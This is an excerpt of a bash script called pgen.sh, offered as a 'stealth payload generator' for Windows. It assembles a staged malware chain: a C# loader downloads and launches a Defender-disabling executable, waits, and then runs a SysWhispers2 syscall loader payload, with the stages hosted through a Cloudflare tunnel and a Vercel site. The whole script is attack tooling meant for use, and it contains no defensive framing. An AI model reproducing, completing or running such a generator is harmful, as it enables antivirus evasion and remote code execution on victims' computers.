#!/bin/bash
# pgen.sh - ULTIMATE STEALTH Payload Generator – with Defender Disabler (stage3a) + Syscall Loader (stage3b)
# Usage: ./pgen.sh -t tunnel.trycloudflare.com -u https://your-site.vercel.app [-v]
# Requirements:
#   - Precompiled stage3.exe from SysWhispers2 (your syscall loader) – will be used as stage3b.exe
#   - defender disabler (e.g., defendnot.exe) – will be used as stage3a.exe
#   Both files must be placed in the paths defined below.
...
# Paths to precompiled executables (ADJUST THESE IF NEEDED)
STAGE3B_SOURCE="../SysWhispers2/stage3.exe"          # your syscall loader
DEFENDER_DISABLER_SOURCE="../defendnot.exe"          # defender disabler (e.g., from https://github.com/es3n1n/defendnot)
...
# ========== C# STAGE2 LOADER (EXE) – now downloads stage3a (disabler) and stage3b (payload) ==========
echo -e "${YELLOW}[3/6] Creating C# Stage2 loader (downloads stage3a and stage3b)...${NC}"
    ...
    class Program
    {
        ...
        static void Main()
        {
            ...
            try
            {
                ...
                // --- Step 1: Download and run defender disabler (stage3a.exe) ---
                ...
                Process.Start(pathA);
                Log("stage3a.exe launched, waiting 10 seconds for it to complete...");
                Thread.Sleep(10000);  // give it time to finish
...
# ========== STAGE 3A (Defender disabler) ==========
echo -e "${YELLOW}[4a/6] Incorporating defender disabler (stage3a.exe)...${NC}"
if [ -f "$DEFENDER_DISABLER_SOURCE" ]; then
    cp "$DEFENDER_DISABLER_SOURCE" payloads/stage3a.exe
    echo -e "${GREEN}✓ stage3a.exe copied to payloads/${NC}"
else
    echo -e "${RED}✗ defender disabler not found at $DEFENDER_DISABLER_SOURCE${NC}"
    echo "Please download defendnot.exe from https://github.com/es3n1n/defendnot/releases and place it in the correct location."
    exit 1
fi
...
if [ -f "$STAGE3B_SOURCE" ]; then
    ...
    echo "Please compile your syscall loader and place it at that location."
    exit 1
fi
